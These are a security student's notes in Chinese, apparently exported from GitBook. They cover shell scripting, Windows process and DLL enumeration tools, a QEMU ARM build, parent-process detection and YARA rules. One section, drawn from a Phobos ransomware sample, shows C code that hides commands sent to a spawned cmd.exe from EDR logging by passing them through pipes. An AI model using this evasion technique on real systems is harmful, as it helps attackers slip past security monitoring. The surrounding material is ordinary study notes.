根据shell的aaa对单引号和双引号的规则，我决定shell中一律使用双引号 name=\"this is a string\" echo $name test_str=\"look at this \\\"$name\\\" \" echo \"-e\" $test_str echo $test_str 切片 #!/bin/bash # using ${#string} to get the length of string str=\"this is a string\" echo \"len of str is \" ${#str} # using ${string:i:j} to get the sub string in string str=\"acdefghijklmn\" echo ${str:1:5} # find specific string using `` & expr index $string sub_str echo `expr index $str c` 数组 #!/bin/bash arry=(1 2 3 4 5 6 7 8 9 10) # using ${array[@]} to print all array elements echo ${arry[@]} # for array, you must use full ${} to print it arry[0]=\"123\" arry[1]=999999999999 echo ${arry[@]} # get elements nunmber [*] or [@] echo ${#arry[@]} echo ${#arry[*]} # delet specific left str by # # delet specific right str by % str=\"http://aabbccddeeffjjhhiiggkk1122334455\" # delet // left str echo ${str#*//} # delet // right str echo ${str%//*} # if you want delet to point char ,you can use double # or % echo ${str%%a*} # using declare arry just like the dictionary declare -A dict_arry=([\"one\"]=1 [\"two\"]=2 [\"three\"]=3 [\"fore\"]=4) echo ${dict_arry['one']} echo ${dict_arry[@]} echo ${#dict_arry[*]} 计算 #!/bin/bash # full expressoins should be include by `` # using 'expr' to add support to shell, because native shell not support normal calculate # space is required between expreesions and operations var=`expr $1 + $2` echo $1 \"add\" $2 \"equal\" $var # conditional expressions must be included by [], and space between expressions and operations echo $[ $1 == $2 ] # return 0 or 1 if [ $var == 24 ] then echo \"$1 * $2 == 144\" fi # -eq -ne…… 这些关系运算符只支持数字，不支持字符串 n1=\"abcdef\" n2=\"abcdef\" if [ $n1 == $n2 ] then echo \"equal\" else echo \"not equal\" fi # bool operations # -a = and # -o = or # ! = not # 逻辑运算符 # && || # string opre: # -n -z check if the strlen = 0 str=\"abcd\" if [ -z str ] then echo \"zero\" else echo \"no 0\" fi 控制流 判断 if-else #!/bin/bash # 利用if判断有多少参数，程序本身自己的启动命令算¥0，但是程序不会将其计算在参数列表内 if [ $# == 1 ] then echo you have one para $* elif [ $# == 2 ] then echo you have two para $@ else echo you have many para $* fi #(())test if (( $# > 3 )); then echo dayu 3 ge para fi if [ $# > 3 ] then echo above 3 para fi 利用test #!/bin/bash # test 用来判断条件是否成立 n1=$1 n2=$2 if test $n1 -eq $n2 then echo 两个参数相同 else echo 两个参数不同 fi if [ $n1 -eq $n2 ] then echo == else echo != fi s1=\"abcdefg\" s2=\"1234567\" readonly $s1 if test $s1 = $s2 then echo equal else echo no equal fi # 和上面的方法一样，同样可以用来检查文件的一些问题 case-esac #!/bin/bash # 类似于C的switch-case结构，除了语法基本上一样 echo -n input a number: read input_num case $input_num in 1) echo you 1 ;; 2) echo you 2 let input_num++ ;; 3) echo you 3 ;; 4|5|6|7|8|9|10) echo you many ;; *) echo you miss ;; esac # 执行完匹配就结束了，并不会一直执行下去 循环 #!/bin/bash # 循环的间隔默认是通过 \"空格\" for i in 1 2 3 4 5 6 7 do echo -e $i \"\\n\" done str=\"ab cd ef gh ij kl mn\" for c in $str do echo $c ', ' done # 使用let来执行表达式，比如let b=9+1之类的东西，不用带¥标记变量 sum=10 while (( $sum 函数 #!/bin/bash # 函数返回值只能是一个整数 0-255，默认最后一句的结果是返回值，或者用return，主函数用$?来表示返回值 first_func() { printf \"%s\" \"this is my first func in shell\" } first_func echo the retuen is $? add_func() { echo the ten para is ${10} echo the ten para is $10 #这两种计算都是可以的 # return $(( $1 + $2 )) return `expr $1 + $2` } # 函数的参数其实和程序的参数是一样的 add_func 12 12 1 1 1 2 2 2 2 2 3 3 3 echo the res is $? 参数 #!/bin/bash # using $n to use para # first para is this shell # usr para begin from second echo \"测试shell添加启动参数\" echo \"first : $0\" echo \"second : $1\" echo \"third : $2\" # using $# to get num of para echo \"total\" $# #using $* to print all para echo \"all para\" $* # using $$ to get current PID echo $$ # using $* the all argu will be analyse to a string for argumet in \"$*\"; do echo $argumet done # using $@, the argu will be analyse one by one for argu in \"$@\"; do echo $argu done print #!/bin/bash # 在shell里，echo和printf的功能基本类似，但是根据教程说，printf的可移植性更高 # printf format_string [arguments] # %作为格式替换符，类似于c语言；-代表左对齐；数字代表宽度 printf \"%-10s %-12s %-12s\\n\" 我是大傻逼 我在轻化2001 我78kg重 printf \"%-10s %-12s %-12s\\n\" abc def 123aaaaaaa printf \"%-10s %-12s %-12s\\n\" 1 2 3 # 当参数多余格式字符串,会重用最后一个格式化字符输出 printf \"%s %d %f\\n\" abc 123 4.1234 abcdefh # using %b to use \\ # 如果这里用\\s那么就会将n直接输出，但是%B可以解决这个问题 printf \"test \" \"A\\nb\" 文件 读文件直接用cat命令；写文件直接用重定位 >> #!/bin/bash # check the unix attributes file_name=\"testfile\" if [ -e file_name ] then if [ -x file_name ] then echo $file_name is excutable fi else echo \"no such a file\" fi # 类似这种格式，判断符号太多了，先用先查 重定位 #!/bin/bash # 正常的重定位 echo this is a string > redirct_file # 追加 echo add the new string >> redirct_file # 如果你不想让命令输出到屏幕上，可以用/dev/null文件，输入到这个文件的内容都会被抛弃 echo aaaaaaaaaaaaaaaaaaaaaaaaaa > /dev/null # stdin 0 ; stdout 1 # 将报错信息也就是stderr（2）重定向到testfile a=10 let b=a/0 2>>testfile 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-19 14:47:18 "},"MyArticles/Dailynotes/就业意向.html":{"url":"MyArticles/Dailynotes/就业意向.html","title":"就业意向","keywords":"","body":"意向 经过几轮24界暑假实习的面试，基本也在和面试官的一次次交流和学长学姐的一次次沟通下基本确定了方向。 大方向 不想去搞研究，希望能站在网络攻防，网络安全的一线上，时刻面对新的攻击和挑战。 如果想去搞研究为什么不去读研呢？ 还是偏向实战的方向。但是面向实战的安全研究也是一个预期的方向。 目前技能 技能分布在二进制安全方向。 原因：CTF出身，学的就是二进制方向，针对web方向的攻防是一个漏洞。 二进制细分的话，分为几个方面： 在逆向分析方向强于漏洞挖掘，因为一直是以逆向分析作为一个发展目标，近期通过分析市场需求发现，逆向发展的一个方向主要有威胁狩猎、安全攻防；漏洞挖掘方面的话，对二进制漏洞挖掘意向不大。 在逆向分析领域，针对android平台的分析弱于Windows和linux平台，因为遇到的少。但是通过需求分析，发现移动安全的需求高于传统安全。 职业意向 想去安全蓝军，想去红队，但是技术上目前还有所欠缺。但是会一直努力的。这学期（23年初）分析完phobos的俩样本之后，就开始学习二进制的漏洞挖掘了。 如果要从事安全研究的话，仅有二进制方向知识是远远不够的，所以web漏洞挖掘方面的知识也是需要补充的，准备暑假去补充一下这个技术。 如果暑假找不到实习的话，那就回家开始学习web渗透测试并继续学习漏洞挖掘。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-02 20:29:42 "},"MyArticles/Development.html":{"url":"MyArticles/Development.html","title":"Development","keywords":"","body":"大丈夫生居天地间，岂能郁郁久居人下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:39:24 "},"MyArticles/Development/find_dll_in_proc.html":{"url":"MyArticles/Development/find_dll_in_proc.html","title":"Find DLL in Process","keywords":"","body":"通过LDR结构体去观察已经载入的dll。如果想直到所有的用到的dll可以通过访问程序的导出表，这里的工具是利用LDR观察正在使用的dll。DLL 是在需要时动态加载的，因此有可能某些 DLL 尚未加载。 缺点：无法观察到通过loadlibrary载入的dll文件。 使用方式： fdip [pid] #include #include #include #include #include \"struct.h\" typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main(int argc, char* argv[]) { // 没有获取到参数的情况 if (argc \\n\", argv[0]); printf(\"Example: fdip32 [proc Id]\\n\"); return 1; } DWORD ProcID = atoi(argv[1]); //DWORD ProcID = 32956; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcID); HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } PEB peb; ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); PPEB_LDR_DATA ldrr = peb.Ldr; PLIST_ENTRY pListEntry = ldrr->InMemoryOrderModuleList.Flink; if (!strcmp(argv[1], \"-a\") || !strcmp(argv[1], \"--a\")) { while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); printf(\"[+^+] Loaded DLL: LLLLL\\tbase address: \\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); pListEntry = pListEntry->Flink; } } else { while (pListEntry != &ldrr->InMemoryOrderModuleList) { PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); printf(\"[++] Loaded DLL: LLLLL\\nbase address: \\n\\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); pListEntry = pListEntry->Flink; } } printf(\"have a nice day :-)\\n\"); CloseHandle(hProcess); return 0; } 上述代码的 printf(\"[++] Loaded DLL: LLLLL\\nbase address: \\n\\n\", pEntry->FullDllName.Buffer, pEntry->DllBase); 里面的LLLLL应该是{%ws}，但是md识别有问题。 思路：通过PEB定位到LDR，然后通过利用InMemoryOrderModuleList访问到LDR_DATA_TABLE_ENTRY结构体，然后通过里面的DllBase FullDllName来访问基址和模块名称。 typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID Reserved3[2]; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; #pragma warning(push) #pragma warning(disable: 4201) // we'll always use the Microsoft compiler union { ULONG CheckSum; PVOID Reserved6; } DUMMYUNIONNAME; #pragma warning(pop) ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 使用效果 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-06 22:10:41 "},"MyArticles/Development/find_thread_in_process.html":{"url":"MyArticles/Development/find_thread_in_process.html","title":"Find Thread in Process","keywords":"","body":"查找进程中的线程 本程序实现了针对输入的proc id，查看该进程中的所有的线程，并且获取线程id的功能。 #include #include #include #include #include int main(int argc , char* argv[]) { // 没有获取到参数的情况 if (argc \\n\", argv[0]); printf(\"Example: ftip [proc Id]\\n\", argv[0]); return 1; } int notePID = atoi(argv[1]); // 申请空间 LPDWORD pThreadIdList = NULL; DWORD dwThreadIdListLength = 0; DWORD dwThreadIdListMaxCount = 2000; HANDLE hThreadSnap = INVALID_HANDLE_VALUE; pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadIdList == NULL) { printf(\"VirtualAlloc Failed\\n我也没辙 :-)\\n\"); return 1; } RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD)); THREADENTRY32 th32 = { 0 }; // 拍摄快照, 通过第一个参数快照系统中的所有线程，指定进程的快照 hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, notePID); if (hThreadSnap == INVALID_HANDLE_VALUE) { printf(\"Get all threads in system Failed\\n我也没辙 :-)\\n\"); return 1; } // 结构的大小 th32.dwSize = sizeof(THREADENTRY32); //遍历所有THREADENTRY32结构, 按顺序填入数组【有关系统快照中遇到的任何进程的第一个线程的信息。】 //函数返回的快照的句柄 , 指向 THREADENTRY32 结构的指针 BOOL bRet = Thread32First(hThreadSnap, &th32); int i = 0; while (bRet) { printf(\"[=> %d ] the thread id is \\t\\t\", ++i, th32.th32ThreadID); if(i%2==0 && i!=0) { printf(\"\\n\"); } // 先检查当前线程是不是指定进程下的线程 if (th32.th32OwnerProcessID == notePID) { if (dwThreadIdListLength >= dwThreadIdListMaxCount) { break; } pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID; } // 遇到的任何进程的下一个线程的信息 bRet = Thread32Next(hThreadSnap, &th32); } printf(TEXT(\"\\nThere are %d threads in process %d.\\n\"), dwThreadIdListLength, notePID); return 0; } 实现了查找目标进程中所有的线程号和线程数量。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-05 23:01:45 "},"MyArticles/Development/Build-Arm.html":{"url":"MyArticles/Development/Build-Arm.html","title":"构建qemu的持续学习","keywords":"","body":"买不起ARM设备，直接在ubuntu上起一个qemu进行模拟arm开发环境 配置环境 sudo apt-get install gcc gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi qemu-user gdb-multiarch 然后再继续安装qemu的依赖项 sudo apt-get install build-essential gcc pkg-config glib-2.0 libglib2.0-dev libsdl1.2-dev libaio-dev libcap-dev libattr1-dev libpixman-1-dev 下载qemu wget https://download.qemu.org/qemu-3.0.0.tar.xz 最简单的就是下载qemu的源码本地编译 建议提前建一个文件夹，然后解压这个文件 tar xvJf qemu-3.0.0.tar.xz 先编译，cd qemu-3.0.0 ./configure 可能的报错： make的时候总是报错，就找到那个报错的文件，把报错的那一行的static关键字删除 关于python的报错：ERROR: Python not found. Use --python=/path/to/python： 直接apt install python, 就行 然后最后一步，可能需要一点时间 make&&make install 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-20 19:32:17 "},"MyArticles/Development/查看父进程.html":{"url":"MyArticles/Development/查看父进程.html","title":"查看父进程","keywords":"","body":"原理 Windows下运行一个程序他的父进程一般都是explore，linux下一般是bash，因为是从shell界面直接起的。 实现方式很多，基本思路就是： 获得父进程的pid 利用pid查找proc name windows C using System; using System.Diagnostics; using System.Management; using System.Windows.Forms; namespace Check_Father { class check_father_proc { static bool if_proc = true; static void Main(string[] args) { // 获取当前进程对象 try { Process currentProcess = Process.GetCurrentProcess(); if (GetParentProcess(currentProcess).ProcessName.Equals(\"explore\")) { if_proc = true; } else { Console.WriteLine($\"{GetParentProcess(currentProcess).ProcessName}\"); } } catch { Environment.Exit(0); } } private static Process GetParentProcess(Process process) { // 获取指定进程的父进程 ID int parentProcessId = 0; ManagementObjectSearcher searcher = new ManagementObjectSearcher($\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"); ManagementObjectCollection collection = searcher.Get(); foreach (ManagementObject obj in collection) { parentProcessId = Convert.ToInt32(obj[\"ParentProcessId\"]); break; } // 获取父进程对象 Process parentProcess = null; if (parentProcessId > 0) { try { parentProcess = Process.GetProcessById(parentProcessId); } catch (Exception) { parentProcess = null; } } return parentProcess; } } } 调用 GetCurrentProcess() 方法获取当前进程对象。 调用 GetParentProcess() 方法获取当前进程的父进程对象。 判断父进程对象的 ProcessName 属性是否为 \"explorer\"，以确定父进程是否为 Windows Explorer。 其中，步骤 2 主要是通过 WMI (Windows Management Instrumentation) 查询获取当前进程的父进程 ID，然后通过调用 Process.GetProcessById() 方法来获取父进程对象。具体实现是： 调用 ManagementObjectSearcher 对象的 Get() 方法来执行 WMI 查询，查询条件为获取父进程 ID，查询语句为 $\"SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = {process.Id}\"。 遍历查询结果，获取父进程 ID。 调用 Process.GetProcessById() 方法根据父进程 ID 获取父进程对象。 C #include #include #include #include #include //GetModuleFileNameEx int main() { // 获取当前进程句柄 HANDLE currentProcess = GetCurrentProcess(); // 获取当前进程 ID DWORD currentProcessId = GetProcessId(currentProcess); // 获取进程快照 HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf(\"CreateToolhelp32Snapshot failed, error code %d\\n\", GetLastError()); return 0; } PROCESSENTRY32 processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32); // 遍历进程快照，查找父进程 if (Process32First(snapshot, &processEntry)) { do { if (processEntry.th32ProcessID == currentProcessId) { // 获取当前进程的父进程 ID DWORD parentProcessId = processEntry.th32ParentProcessID; // 根据父进程 ID 获取父进程句柄 HANDLE parentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId); if (parentProcess != NULL) { // 获取父进程的名称 TCHAR parentProcessName[MAX_PATH]; if (GetModuleFileNameEx(parentProcess, NULL, parentProcessName, MAX_PATH)) { // 判断父进程名称是否为 explorer.exe if (_tcsicmp(parentProcessName, _T(\"explorer.exe\")) == 0) { printf(\"The parent process is explorer.exe.\\n\"); } else { printf(\"The parent process is %ws.\\n\", parentProcessName); } } else { printf(\"GetModuleFileNameEx failed, error code %d\\n\", GetLastError()); } CloseHandle(parentProcess); } else { printf(\"OpenProcess failed, error code %d\\n\", GetLastError()); } break; } } while (Process32Next(snapshot, &processEntry)); } else { printf(\"Process32First failed, error code %d\\n\", GetLastError()); } CloseHandle(snapshot); return 0; } 使用 GetCurrentProcess() 获取当前进程的句柄。 使用 GetProcessId() 获取当前进程的 ID。 使用 CreateToolhelp32Snapshot() 创建进程快照。 遍历进程快照，查找父进程。使用 Process32First() 获取第一个进程的信息，然后使用 Process32Next() 遍历下一个进程，直到找到当前进程。 获取当前进程的父进程 ID，并使用 OpenProcess() 函数打开父进程的句柄。 使用 `GetModuleFileName Linux 因为linux是基于文件的，所以需要通过文件来获得进程名称，但是linux有现成的函数可以直接得到父进程的pid，各有千秋。 进程对应的进程号在/proc目录下存在一个对应pid的目录。 随便进去一个可以看到很多文件 comm文件里面存放的就是进程的名称 C #include #include #include #include #include int main() { pid_t pid = getpid(); pid_t ppid = getppid(); char filename[256]; // 获取当前进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", pid); // 构造文件名 FILE* fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } // 获取父进程的进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", ppid); // 构造文件名 fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process parent name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 19:46:56 "},"MyArticles/CyberSec.html":{"url":"MyArticles/CyberSec.html","title":"CyberSec","keywords":"","body":"雪暗凋旗画，风多杂鼓声。宁为百夫长，胜作一书生。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:33 "},"MyArticles/CyberSec/免杀手法收集.html":{"url":"MyArticles/CyberSec/免杀手法收集.html","title":"免杀手法收集","keywords":"","body":"phobos样本 利用管道通信传递参数 利用CreateProcess调用出cmd之后，如果直接将cmd的参数放进api中，则会被EDR进行记录，可以使用管道通信的形式去传递参数。可以使用runas命令提权或者是关闭防火墙命令。 进程间通信（IPC）机制 进程间通信（IPC）机制是指同一台计算机的不同进程之间或网络上不同计算机进程之间的通信。Windows下的方法包括邮槽（Mailslot）、管道（Pipes）、事件（Events）、文件映射（FileMapping）等。 管道分有名和匿名两种。 命名管道：可以在同台机器的不同进程间以及不同机器上的不同进程之间进行双向通信。 匿名管道：只在父子进程之间或者一个进程的两个子进程之间进行通信，它是单向的。 管道操作标示符是HANDLE，利用这个机制，直接使用ReadFile or WriteFile就可以实现了 若2个进程无“父子“关系，且子进程又未继承父进程资源，则这俩进程无法使用Pipe传递数据。 过程 创建两个匿名管道，一个读一个写。 创造一个子进程，将输入输出句柄重定向到管道 用ReadFile()和WriteFile()读写管道实现进程的通信 例子 利用程序创建cmd子进程执行一个弹出计算器的命令。 #include #include #include #include int main() { // frist create two pipe, because the anonymous pipe is unidirectional HANDLE hReadPipe; HANDLE hWritePipe; SECURITY_ATTRIBUTES sa = { 0 }; sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.bInheritHandle = TRUE; if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) { printf(\"CreatePipe Failed %d\\n\", GetLastError()); return 1; } HANDLE hReadPipe1; HANDLE hWritePipe1; if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0)) { printf(\"CreatePipe1 Failed %d\\n\", GetLastError()); return 1; } // create a process cmd STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi)); //relocaltion stdout, // Turn the input of the child process into a read pipe si.hStdInput = hReadPipe; // Turn the output of the child process into a write pipe si.hStdOutput = hWritePipe1; si.hStdError = hWritePipe1; si.dwFlags = STARTF_USESTDHANDLES; LPTSTR program = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; if (!CreateProcessW(program, NULL, 0, 0, TRUE, 0, 0, 0, &si, &pi)) { printf(\"CreateProcess Failed %d\\n\", GetLastError()); return 1; } // send command to cmd.exe, cmd.exe stop by \"\\r\\n\" char lpBuffer[] = \"calc\\r\\n\"; if (!WriteFile(hWritePipe, lpBuffer, (DWORD)strlen(lpBuffer)+1, NULL, 0)) { printf(\"WriteFile Failed %d\\n\", GetLastError()); return 1; } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0; } 上述代码执行之后可以调用cmd弹出一个calc。还可以通过设置 CreateProcessW(program, NULL, 0, 0, TRUE, 0, 0, 0, &si, &pi)的第六个参数来设置新进程不可见 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-08 21:58:20 "},"MyArticles/CyberSec/yara.html":{"url":"MyArticles/CyberSec/yara.html","title":"YARA学习","keywords":"","body":"官方文档说明：https://yara.readthedocs.io/en/v3.7.0/index.html 官方的github库地址：https://github.com/VirusTotal/yara/releases bilibili学习分享：https://www.bilibili.com/video/BV1dt4y12753/ Yara是什么 YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. Each description, a.k.a rule, consists of a set of strings and a boolean expression which determine its logic.【https://virustotal.github.io/yara/】 yara用处 样本分类 快速筛选 过滤文件 自定义CTF题目类型 完成任务 识别漏洞 安装 windows 直接下载之后解压，在path变量里写入路径，可以在终端直接yara Mac brew install yara 使用 命令解释 > yara --help YARA 4.2.2, the pattern matching swiss army knife. Usage: yara [OPTION]... [NAMESPACE:]RULES_FILE... FILE | DIR | PID Mandatory arguments to long options are mandatory for short options too. --atom-quality-table=FILE path to a file with the atom quality table -C, --compiled-rules 加载已经编译的规则 -c, --count 显示中标的样本个数 -d, --define=VAR=VALUE 定义外部变量 --fail-on-warnings 出现警告时运行失败 -f, --fast-scan 快速匹配模式 -h, --help 显示帮助并退出 -i, --identifier=IDENTIFIER 只显示名为IDENTIFIERd --max-process-memory-chunk=NUMBER 设置扫描进程的最大值 (default=1073741824) -l, --max-rules=NUMBER 扫描达到设定值后退出 --max-strings-per-rule=NUMBER 设定每个进程的最大字符串匹配数(default=10000) -x, --module-data=MODULE=FILE 将FIle的内容作为额外的数据传递给MOUDLE -n, --negate 只显示不满足的规则 (negate) -N, --no-follow-symlinks 扫描时不跟随符号连接 -w, --no-warnings 禁用警告 -m, --print-meta 打印元数据 -D, --print-module-data 打印模块数据 -e, --print-namespace 显示规则的命名空间 -S, --print-stats 打印规则的统计信息 -s, --print-strings 打印匹配的字符串 -L, --print-string-length 打印匹配字符串的长度 -g, --print-tags 打印标签 -r, --recursive 递归扫描目录 --scan-list 扫描FILE中列出的文件，每行显示以一个 -z, --skip-larger=NUMBER 跳过目录中size大于设置size的文件 -k, --stack-size=SLOTS 设置最大堆栈的大小 (default=16384) -t, --tag=TAG 只打印标记为tag的规则 -p, --threads=NUMBER 使用指定的线程数扫描目录 -a, --timeout=SECONDS 在达到给定的时间（s）之后跳出扫描 -v, --version 显示yara的当前版本信息 Send bug reports and suggestions to: vmalvarez@virustotal.com. 向 vmalvarez@virustotal.com 发送建议和bug 一般结构 banker.yara文件： rule silent_banker : banker { meta: description = \"This is just an example\" thread_level = 3 in_the_wild = true strings: $a = {6A 40 68 00 30 00 00 6A 14 8D 91} $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9} $c = \"UVODFRYSIHLNWPEJXQZAKCBGMT\" condition: $a or $b or $c } 规则一般写在后缀为yara的文件里。利用yara banker.yara来执行 第一行：对于该yara规则的说明。指出这是一个banker类型的样本匹配规则 第三行：meta关键字后面跟一些面描述信息。 第七行：strings关键字后：定义了三个变量，利用{}的形式写16进制字符串 第十一行：condition关键字后：利用or关键字表示如果匹配文件中了其中一个，则算为banker malware。 可以看到： 16进制 ==》 {} 通配符 使用?作为通配符，可以代表任何内容，大小是一个半个字节。 rule WildcardExample { strings: $hex_string = { E2 34 ?? C8 A? FB } condition: $hex_string } 跳转 利用[n-n+x]的方式进行跳转，指的是跳过一定数量的字节。如下程序是跳过4-6个字节 rule JumpExample { strings: $hex_string = { F4 23 [4-6] 62 B4 } condition: $hex_string } [-]代表无限制跳转，不限制跳转个数 字符串 ==》 “str” nocase：不区分大小写，适用于字符串 base64：base64字符串 xor：异或字符串 wide：宽字符 wide 如果字符串“Borland”显示为编码为每个字符两个字节（即 ），则以下规则将匹配：B\\x00o\\x00r\\x00l\\x00a\\x00n\\x00d\\x00 rule WideCharTextExample1 { strings: $wide_string = \"Borland\" wide condition: $wide_string } xor 搜索应用于字符串“ ”（包括纯文本字符串）的每个字节 XOR形式： rule XorExample5 { strings: $xor_string = \"This program cannot\" xor(0x01-0xff) condition: $xor_string } 这就等效于 rule XorExample2 { strings: $xor_string_00 = \"This program cannot\" $xor_with_1 = \"Uihr!qsnfs`l!b`oonu\" $xor_with_2 = \"Vjkq\\\"rpmepco\\\"acllmv\" …… condition: any of them } base64 rule Base64Example1 { strings: $a = \"This program cannot\" base64 condition: $a } 支持自定义的base码表 rule Base64Example2 { strings: $a = \"This program cannot\" base64(\"!@#$%^&*(){}[].,|ABCDEFGHIJ\\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu\") condition: $a } 字符串计数 该字符串在文件或进程内存中出现了多少次。每个字符串的出现次数由一个变量表示，该变量的名称是字符串标识符，但用 # 字符代替 $ 字符 rule CountExample { strings: $a = \"dummy1\" $b = \"dummy2\" condition: #a == 6 and #b > 10 } 从YARA 4.2.0开始，可以在整数范围内表示字符串的计数 #a in (filesize-500..filesize) == 2 代表了文件最后500字节的数据内必须存在a字符串两次 字符串集 命中多个字符串的其中一个就可以 rule OfExample1 { strings: $a = \"dummy1\" $b = \"dummy2\" $c = \"dummy3\" condition: 2 of ($a,$b,$c) } 文件中必须至少存在集合中的两个字符串（$a，$b，$c）。 也可以使用通配符来写： rule OfExample2 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $foo3 = \"foo3\" condition: 2 of ($foo*) } rule OfExample3 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $bar1 = \"bar1\" $bar2 = \"bar2\" condition: 3 of ($foo*,$bar1,$bar2) } 甚至也可以写成 condition: 1 of them 从YARA 4.2.0开始，可以在整数范围内表示一组字符串，如下所示： all of ($a*) in (filesize-500..filesize) any of ($a*, $b*) in (1000..2000) 添加过滤 size过滤 在从大量的文件中获取样本时，可能需要根据样本的大小特征进行过滤；否则会对每一个文件都进行匹配 condition: filesize > 200KB and filesize 入口点过滤 yara3.0之前可以用entry_point来获得程序入口点；yara3.0之后通过pe.entry_point变量来获得入口点 注意：入口点的地址需要写offset（File Offset），并不是在ida中看到的entry_point。[这个是自动获取的，不需要预先定义]。 condition: pe.entry_point == 0x990 at取值 同样适用于匹配入口点. string: $entry = {48 83 EC 28} condition: $entry at pe.entry_point 这里利用的是匹配入口点地址对应的数据 文件头判断 利用uint16(0) 的方式取文件的前两个字节，可以判断一般文件的文件头。 condition: unit16(0) == 0x4D5A and uint32(uint32(0x3C)) == 0x00004550 0x4D5A是一般PE文件的开头 ”MZ“ . ps: uint16是16位无符号整型，就是两个字节 之上提到的所有condition都可以通过and进行连接 访问给定位置的数据 使用下列函数之一从给定偏移量的文件读取数据： int8() int16() int32() uint8() uint16() uint32() int8be() int16be() int32be() uint8be() uint16be() uint32be() 函数从读取 8、16 和 32 位有符号整数，而函数读取无符号整数。16 位和 32 位整数都被视为小端序。 迭代器 for..of for any section in pe.sections : ( section.name == \".text\" ) 相当于是 for any i in (0..pe.number_of_sections-1) : ( pe.sections[i].name == \".text\" ) 迭代字典时，必须提供两个变量名称，用于保存字典中每个条目的键和值 for any k,v in some_dict : ( k == \"foo\" and v == \"bar\" ) 规则条件 and：与 or：或 not：非 [all of them]：所有条件匹配即告警 [any of them]：有一个条件匹配即告警 [a and b and $c]：abc同时匹配即告警 [(a and b) or $c]：匹配a和b或c即告警 引用其他规则 利用规则集的形式引用其他规则 rule Rule1 { strings: $a = \"dummy1\" condition: $a } rule Rule2 { strings: $a = \"dummy2\" condition: $a } rule MainRule { strings: $a = \"dummy2\" condition: any of (Rule*) } 演示 cs启用 